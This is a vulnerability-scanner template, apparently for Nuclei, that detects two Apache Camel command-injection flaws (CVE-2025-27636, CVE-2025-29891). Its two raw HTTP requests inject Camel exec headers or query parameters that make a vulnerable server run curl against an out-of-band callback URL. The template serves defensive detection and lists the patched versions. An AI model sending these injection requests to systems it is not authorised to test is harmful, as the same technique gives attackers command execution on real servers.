id: CVE-2025-27636-CVE-2025-29891

info:
  name: Apache Camel Exec Component Command Injection & Internal Method Invocation
  author: Ostorlab Team
  severity: high
  description: |
    Bypass/Injection vulnerabilities in Apache Camel. These issues affect Apache Camel: from 4.10.0 through <= 4.10.1, from 4.8.0 through <= 4.8.4, from 3.10.0 through <= 3.22.3.
    - CVE-2025-27636: Case-insensitive header filtering bypass allows overriding static commands.
    - CVE-2025-29891: Query parameter manipulation enables arbitrary command execution.
  remediation: |
    Users are recommended to upgrade to version 4.10.2 for 4.10.x LTS, 4.8.5 for 4.8.x LTS, and 3.22.4 for 3.x releases.
  reference:
    - https://camel.apache.org/security/CVE-2025-27636.html
    - https://camel.apache.org/security/CVE-2025-29891.html
    - https://issues.apache.org/jira/browse/CAMEL-21828
    - https://lists.apache.org/thread/l3zcg3vts88bmc7w8172wkgw610y693z
    - http://www.openwall.com/lists/oss-security/2025/03/09/1
    - https://github.com/akamai/CVE-2025-27636-Apache-Camel-PoC
  classification:
    epss-score: 0.00043
    epss-percentile: 0.1187
  metadata:
    verified: true
    max-request: 2
  tags: cve,cve2025,apache,camel,rce,oob,oast

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        CAmelExecCommandExecutable: curl
        CAmelExecCommandArgs: http://{{interactsh-url}}

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the HTTP Interaction
        words:
          - "http"
      - type: word
        part: interactsh_request
        words:
          - "User-Agent: curl"

  - raw:
      - |
        GET /vulnerable?CAmelExecCommandExecutable=curl&CAmelExecCommandArgs=http://{{interactsh-url}} HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the HTTP Interaction
        words:
          - "http"
      - type: word
        part: interactsh_request
        words:
          - "User-Agent: curl"
